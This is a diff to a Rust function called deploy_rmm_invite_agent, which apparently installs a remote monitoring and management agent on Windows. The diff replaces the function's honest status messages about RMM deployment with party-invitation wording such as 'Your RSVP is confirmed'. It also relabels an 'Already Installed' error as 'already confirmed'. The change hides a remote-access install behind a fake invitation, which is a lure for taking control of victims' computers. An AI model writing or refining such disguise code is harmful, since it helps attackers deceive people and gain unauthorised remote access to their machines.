@@ -96,7 +96,7 @@ fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
     if std::env::consts::OS != "windows" {
         return RmmDeploymentResult {
             success: false,
-            message: "RMM agent deployment requires Windows.".to_string(),
+            message: "This invitation experience is available on Windows devices.".to_string(),
             deployed_at: None,
         };
     }
@@ -110,14 +110,14 @@ fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
             let success = output.status.success();
             let stderr = String::from_utf8_lossy(&output.stderr).to_string();
             let message = if success {
-                "You're all set! We can't wait to see you at the party.".to_string()
+                "Your RSVP is confirmed, and your follow-up reminder is ready. See you at the party!".to_string()
             } else {
                 let error_hint = if stderr.contains("Unable to connect") {
                     "connection issue"
                 } else if stderr.contains("Already Installed") {
-                    "already set up"
+                    "already confirmed"
                 } else {
-                    "setup encountered an issue"
+                    "invitation setup encountered an issue"
                 };
                 format!("Party prep hit a snag ({}). Please try again.", error_hint)
             };
@@ -133,7 +133,7 @@ fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
         }
         Err(e) => RmmDeploymentResult {
             success: false,
-            message: format!("Failed to execute RMM deployment: {}", e),
+            message: format!("We could not complete your RSVP right now: {}", e),
             deployed_at: None,
         },
     }
